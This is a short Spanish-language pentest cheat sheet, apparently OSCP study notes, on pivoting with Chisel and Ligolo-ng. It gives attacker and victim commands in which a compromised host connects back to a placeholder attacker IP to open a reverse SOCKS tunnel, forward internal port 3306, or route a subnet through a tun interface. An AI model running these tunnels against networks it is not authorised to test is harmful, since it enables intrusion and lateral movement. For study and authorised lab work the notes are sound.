---
title: "Chisel & Ligolo (Tools)"
layout: "single"
category: "Pivoting"
slug: "pivoting/tools"
date: "2025-11-26"
---

### Chisel (El estándar OSCP)
Funciona por HTTP, atraviesa firewalls.

**Escenario: Reverse SOCKS Proxy**
(La víctima se conecta a ti y te da un túnel SOCKS).

1. **Atacante (Server):**
   ```bash
   ./chisel server -p 8000 --reverse
   ```

2. **Víctima (Client):**
   ```bash
   ./chisel client <IP_ATACANTE>:8000 R:socks
   ```

3. **Config:** Proxychains puerto **1080**.

**Escenario: Port Forward**
(Traer puerto 3306 interno a tu puerto 3306).
* Client: `./chisel client <IP_ATACANTE>:8000 R:3306:127.0.0.1:3306`

---

### Ligolo-ng (Avanzado)
Crea una interfaz de red virtual (`tun`) en lugar de un proxy SOCKS. Es más rápido y permite `ping` y `nmap -sS`.

1. **Atacante:**
   ```bash
   sudo ip tuntap add user kali mode tun ligolo
   sudo ip link set ligolo up
   ./proxy -selfcert
   ```

2. **Víctima:**
   ```bash
   ./agent -connect <IP_ATACANTE>:11601 -ignore-cert
   ```

3. **Atacante (En la consola de ligolo):**
   ```text
   session 1
   start
   ```
   *Luego añadir ruta en Kali:* `sudo ip route add 10.10.10.0/24 dev ligolo`
